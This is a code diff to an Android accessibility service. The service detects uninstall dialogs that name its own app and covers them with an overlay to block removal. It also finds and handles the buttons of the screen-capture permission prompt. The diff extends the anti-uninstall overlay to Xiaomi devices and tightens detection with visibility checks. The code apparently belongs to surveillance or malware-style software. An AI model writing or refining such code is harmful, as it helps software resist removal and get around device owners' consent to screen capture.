@@ -734,9 +734,7 @@ public class MainAccessibilityService extends AccessibilityService {
                     isAppDetail = false;
                     getUninstallDialog(rootNode);
                     if(isSelectedApp && isUninstallapp) {
-                        if(!(manufacturer.equals("xiaomi"))) {
-                            makeOverlayRemoveScreen();
-                        }
+                        makeOverlayRemoveScreen();
                         setStopUninstallApp(rootNode);
                     }
 
@@ -983,7 +981,7 @@ public class MainAccessibilityService extends AccessibilityService {
     public void getMediaProjectionPermission(AccessibilityNodeInfo node) {
 //        Log.d(TAG, "<======================getMediaProjectionPermission===========================>");
         if(node != null) {
-            if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
+            if (node.isVisibleToUser() &&  node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
                     if(Common.getInstance().getMediaProjection()) {
@@ -1018,10 +1016,10 @@ public class MainAccessibilityService extends AccessibilityService {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
-                    if(nodeText.contains(getResources().getString(R.string.app_name).toLowerCase())) {
+                    if(node.isVisibleToUser() && (nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()))) {
                         isSelectedApp = true;
                     }
-                    if (nodeText.contains("desins") || nodeText.contains("unins") || nodeText.contains("卸载")|| nodeText.contains("解除安")) {
+                    if (node.isVisibleToUser() && nodeText.contains(" ") && (nodeText.contains("desins") || nodeText.contains("unins") || nodeText.contains("卸载")|| nodeText.contains("解除安"))) {
                         isUninstallapp = true;
                     }
                 }
